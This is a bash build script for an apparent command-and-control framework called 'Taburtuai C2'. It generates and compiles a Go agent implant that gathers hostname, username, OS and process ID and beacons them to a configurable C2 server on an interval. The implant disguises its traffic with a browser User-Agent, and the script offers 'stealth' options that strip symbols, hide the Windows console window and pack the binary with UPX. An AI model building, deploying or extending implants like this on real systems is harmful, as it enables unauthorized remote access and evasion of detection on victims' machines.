#!/bin/bash

# Enhanced Agent Build Script for Taburtuai C2
set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Defaults
DEFAULT_SERVER_URL="http://127.0.0.1:8080"
DEFAULT_KEY="SpookyOrcaC2AES1"
DEFAULT_SECONDARY_KEY="TaburtuaiSecondary"
DEFAULT_INTERVAL="30"
DEFAULT_JITTER="0.3"

BUILD_DIR="./bin"
AGENT_DIR="./agent"
STAGELESS_DIR="$AGENT_DIR/stageless"

print_status() { echo -e "${BLUE}[INFO]${NC} $1"; }
print_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }
print_error() { echo -e "${RED}[ERROR]${NC} $1"; }

show_usage() {
    cat << 'USAGE_EOF'
Enhanced Agent Build Script for Taburtuai C2

Usage: ./build_agent.sh [OPTIONS]

Options:
    -s, --server URL        C2 server URL (default: http://127.0.0.1:8080)
    -k, --key KEY          Primary encryption key (default: SpookyOrcaC2AES1)
    -i, --interval SEC     Beacon interval in seconds (default: 30)
    -j, --jitter FLOAT     Jitter factor 0.0-1.0 (default: 0.3)
    -o, --os TARGET        Target OS: windows, linux, darwin (default: current)
    -a, --arch ARCH        Target architecture: amd64, 386 (default: amd64)
    -n, --name NAME        Output filename (default: auto-generated)
    -S, --stealth          Enable stealth compilation options
    -c, --compress         Compress final binary with UPX
    -h, --help             Show this help message

Examples:
    # Build basic agent
    ./build_agent.sh

    # Build for Windows with custom server
    ./build_agent.sh -s http://192.168.1.100:8080 -o windows

    # Build with stealth options
    ./build_agent.sh -S -c -o windows
USAGE_EOF
}

validate_params() {
    print_status "Validating build parameters..."
    
    if ! [[ "$INTERVAL" =~ ^[0-9]+$ ]] || [ "$INTERVAL" -lt 1 ]; then
        print_error "Invalid interval: $INTERVAL"
        exit 1
    fi
    
    case "$TARGET_OS" in
        windows|linux|darwin) ;;
        *) print_error "Invalid OS: $TARGET_OS"; exit 1 ;;
    esac
    
    case "$TARGET_ARCH" in
        amd64|386) ;;
        *) print_error "Invalid arch: $TARGET_ARCH"; exit 1 ;;
    esac
    
    print_success "Parameters validated"
}

setup_build_env() {
    print_status "Setting up build environment..."
    
    mkdir -p "$BUILD_DIR" "$AGENT_DIR" "$STAGELESS_DIR"
    
    if [ ! -f "$STAGELESS_DIR/go.mod" ]; then
        cat > "$STAGELESS_DIR/go.mod" << 'MOD_EOF'
module enhanced-agent

go 1.21

require ()
MOD_EOF
    fi
    
    print_success "Build environment setup complete"
}

create_agent_source() {
    print_status "Creating enhanced agent source with UUID..."
    
    local source_file="$STAGELESS_DIR/main.go"
    
    cat > "$source_file" << 'AGENT_SOURCE_EOF'
package main

import (
	"bytes"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"time"
)

// Configuration - will be replaced during build
var (
	defaultServerURL = "PLACEHOLDER_SERVER_URL"
	defaultKey      = "PLACEHOLDER_KEY"
	defaultInterval = "PLACEHOLDER_INTERVAL"
	defaultJitter   = "PLACEHOLDER_JITTER"
)

type Agent struct {
	ID           string
	ServerURL    string
	EncryptionKey string
	Interval     time.Duration
	isRunning    bool
	client       *http.Client
}

type AgentInfo struct {
	ID          string `json:"id"`
	Hostname    string `json:"hostname"`
	Username    string `json:"username"`
	OS          string `json:"os"`
	Architecture string `json:"architecture"`
	ProcessID   int    `json:"process_id"`
}

func generateUUID() string {
	b := make([]byte, 16)
	_, err := rand.Read(b)
	if err != nil {
		// Fallback to time-based if crypto/rand fails
		now := time.Now().UnixNano()
		for i := range b {
			b[i] = byte((now >> (i * 8)) & 0xFF)
		}
	}
	
	b[6] = (b[6] & 0x0f) | 0x40 // Version 4
	b[8] = (b[8] & 0x3f) | 0x80 // Variant bits
	
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}

func NewAgent() (*Agent, error) {
	interval, err := strconv.Atoi(defaultInterval)
	if err != nil {
		interval = 30
	}
	
	return &Agent{
		ID:           generateUUID(),
		ServerURL:    defaultServerURL,
		EncryptionKey: defaultKey,
		Interval:     time.Duration(interval) * time.Second,
		isRunning:    false,
		client:       &http.Client{Timeout: 30 * time.Second},
	}, nil
}

func (a *Agent) collectAgentInfo() AgentInfo {
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}
	
	return AgentInfo{
		ID:          a.ID,
		Hostname:    hostname,
		Username:    username,
		OS:          runtime.GOOS,
		Architecture: runtime.GOARCH,
		ProcessID:   os.Getpid(),
	}
}

func (a *Agent) checkin() error {
	agentInfo := a.collectAgentInfo()
	
	jsonData, err := json.Marshal(agentInfo)
	if err != nil {
		return err
	}
	
	url := a.ServerURL + "/api/v1/checkin"
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	
	resp, err := a.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	
	return nil
}

func (a *Agent) Start() error {
	a.isRunning = true
	
	fmt.Printf("Starting enhanced agent %s\n", a.ID)
	fmt.Printf("Target server: %s\n", a.ServerURL)
	fmt.Printf("Beacon interval: %v\n", a.Interval)
	
	if err := a.checkin(); err != nil {
		fmt.Printf("Initial checkin failed: %v\n", err)
	} else {
		fmt.Printf("Initial checkin successful\n")
	}
	
	for a.isRunning {
		time.Sleep(a.Interval)
		
		if err := a.checkin(); err != nil {
			fmt.Printf("Checkin failed: %v\n", err)
		} else {
			fmt.Printf("Checkin successful at %s\n", time.Now().Format("15:04:05"))
		}
	}
	
	return nil
}

func main() {
	agent, err := NewAgent()
	if err != nil {
		fmt.Printf("Failed to create agent: %v\n", err)
		os.Exit(1)
	}
	
	if err := agent.Start(); err != nil {
		fmt.Printf("Agent failed: %v\n", err)
		os.Exit(1)
	}
}
AGENT_SOURCE_EOF

    print_success "Enhanced agent source created with UUID support"
}

prepare_source() {
    print_status "Preparing source code with build configuration..."
    
    local source_file="$STAGELESS_DIR/main.go"
    
    # Replace placeholders
    if [[ "$OSTYPE" == "darwin"* ]]; then
        sed -i '' \
            -e "s|PLACEHOLDER_SERVER_URL|$SERVER_URL|g" \
            -e "s|PLACEHOLDER_KEY|$KEY|g" \
            -e "s|PLACEHOLDER_INTERVAL|$INTERVAL|g" \
            -e "s|PLACEHOLDER_JITTER|$JITTER|g" \
            "$source_file"
    else
        sed -i \
            -e "s|PLACEHOLDER_SERVER_URL|$SERVER_URL|g" \
            -e "s|PLACEHOLDER_KEY|$KEY|g" \
            -e "s|PLACEHOLDER_INTERVAL|$INTERVAL|g" \
            -e "s|PLACEHOLDER_JITTER|$JITTER|g" \
            "$source_file"
    fi
    
    print_success "Source code prepared"
}

build_agent() {
    print_status "Building enhanced agent..."
    
    if [ -z "$OUTPUT_NAME" ]; then
        OUTPUT_NAME="enhanced_agent_${TARGET_OS}_${TARGET_ARCH}"
        if [ "$TARGET_OS" = "windows" ]; then
            OUTPUT_NAME="${OUTPUT_NAME}.exe"
        fi
    fi
    
    local ldflags=""
    if [ "$STEALTH" = true ]; then
        ldflags="-s -w"
        if [ "$TARGET_OS" = "windows" ]; then
            ldflags="$ldflags -H windowsgui"
        fi
        print_status "Stealth mode enabled"
    fi
    
    export GOOS="$TARGET_OS"
    export GOARCH="$TARGET_ARCH"
    export CGO_ENABLED=0
    
    print_status "Building for $TARGET_OS/$TARGET_ARCH..."
    
    cd "$STAGELESS_DIR"
    if go build -ldflags "$ldflags" -o "../../$BUILD_DIR/$OUTPUT_NAME" .; then
        print_success "Agent built successfully: $BUILD_DIR/$OUTPUT_NAME"
    else
        print_error "Build failed"
        exit 1
    fi
    cd - > /dev/null
}

compress_binary() {
    if [ "$COMPRESS" = true ]; then
        print_status "Compressing binary with UPX..."
        
        if command -v upx >/dev/null 2>&1; then
            if upx --best "$BUILD_DIR/$OUTPUT_NAME" 2>/dev/null; then
                print_success "Binary compressed"
            else
                print_warning "UPX compression failed"
            fi
        else
            print_warning "UPX not found, skipping compression"
        fi
    fi
}

show_summary() {
    local file_size
    if [ -f "$BUILD_DIR/$OUTPUT_NAME" ]; then
        file_size=$(ls -lh "$BUILD_DIR/$OUTPUT_NAME" | awk '{print $5}')
    else
        file_size="Unknown"
    fi
    
    echo ""
    echo -e "${GREEN}╔════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                    Enhanced Agent Build Complete                ║${NC}"
    echo -e "${GREEN}╚════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${BLUE}Build Details:${NC}"
    echo -e "  Target:          ${YELLOW}$TARGET_OS/$TARGET_ARCH${NC}"
    echo -e "  Output:          ${YELLOW}$BUILD_DIR/$OUTPUT_NAME${NC}"
    echo -e "  File Size:       ${YELLOW}$file_size${NC}"
    echo -e "  Server URL:      ${YELLOW}$SERVER_URL${NC}"
    echo -e "  Beacon Interval: ${YELLOW}${INTERVAL}s${NC}"
    echo ""
    echo -e "${BLUE}Features:${NC}"
    echo -e "  ${GREEN}✓${NC} UUID-based agent identification"
    echo -e "  ${GREEN}✓${NC} Enhanced communication protocol"
    echo -e "  ${GREEN}✓${NC} Configurable beacon intervals"
    echo -e "  ${GREEN}✓${NC} Cross-platform compatibility"
    echo ""
    echo -e "${BLUE}Next Steps:${NC}"
    echo -e "  ${GREEN}1.${NC} Deploy: ${YELLOW}$BUILD_DIR/$OUTPUT_NAME${NC}"
    echo -e "  ${GREEN}2.${NC} Monitor: ${YELLOW}taburtuai-cli agents list${NC}"
    echo -e "  ${GREEN}3.${NC} Dashboard: ${YELLOW}$SERVER_URL${NC}"
    echo ""
}

parse_args() {
    # Set defaults
    SERVER_URL="$DEFAULT_SERVER_URL"
    KEY="$DEFAULT_KEY"
    INTERVAL="$DEFAULT_INTERVAL"
    JITTER="$DEFAULT_JITTER"
    TARGET_OS=$(go env GOOS 2>/dev/null || echo "linux")
    TARGET_ARCH="amd64"
    OUTPUT_NAME=""
    STEALTH=false
    COMPRESS=false
    
    while [[ $# -gt 0 ]]; do
        case $1 in
            -s|--server)
                SERVER_URL="$2"
                shift 2
                ;;
            -k|--key)
                KEY="$2"
                shift 2
                ;;
            -i|--interval)
                INTERVAL="$2"
                shift 2
                ;;
            -j|--jitter)
                JITTER="$2"
                shift 2
                ;;
            -o|--os)
                TARGET_OS="$2"
                shift 2
                ;;
            -a|--arch)
                TARGET_ARCH="$2"
                shift 2
                ;;
            -n|--name)
                OUTPUT_NAME="$2"
                shift 2
                ;;
            -S|--stealth)
                STEALTH=true
                shift
                ;;
            -c|--compress)
                COMPRESS=true
                shift
                ;;
            -h|--help)
                show_usage
                exit 0
                ;;
            *)
                print_error "Unknown option: $1"
                show_usage
                exit 1
                ;;
        esac
    done
}

check_dependencies() {
    print_status "Checking build dependencies..."
    
    if ! command -v go >/dev/null 2>&1; then
        print_error "Go is not installed or not in PATH"
        exit 1
    fi
    
    local go_version=$(go version | grep -oE 'go[0-9]+\.[0-9]+' | sed 's/go//')
    print_success "Go $go_version found"
    
    if [ "$COMPRESS" = true ] && ! command -v upx >/dev/null 2>&1; then
        print_warning "UPX not found - compression will be skipped"
        COMPRESS=false
    fi
}

main() {
    echo -e "${BLUE}"
    cat << 'HEADER_EOF'
╔══════════════════════════════════════════════════════════════════╗
║               Enhanced Agent Build Script v2.1                  ║
║                    Taburtuai C2 - Phase 1                       ║
╚══════════════════════════════════════════════════════════════════╝
HEADER_EOF
    echo -e "${NC}"
    
    parse_args "$@"
    check_dependencies
    validate_params
    setup_build_env
    create_agent_source
    prepare_source
    build_agent
    compress_binary
    show_summary
    
    print_success "Enhanced agent build completed successfully!"
}

main "$@"
